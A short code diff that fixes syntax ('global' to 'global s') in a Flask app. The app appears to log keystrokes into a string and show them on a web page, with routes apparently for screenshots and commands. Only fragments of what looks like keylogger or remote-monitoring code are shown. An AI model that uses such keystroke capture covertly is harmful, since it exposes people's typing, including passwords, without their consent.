@@ -10,7 +10,7 @@ s = ""
 
 
 def press(event):
-    global
+    global s
     s += event.name + " "
 
 
@@ -22,7 +22,7 @@ def shot():
 
 @app.route("/clear")
 def clear():
-    global
+    global s
     s = ""
     return render_template("back.html")
 
@@ -40,7 +40,7 @@ def cmd():
 
 @app.route("/")
 def index():
-    global
+    global s
     return render_template("index.html", s=s)
 
 
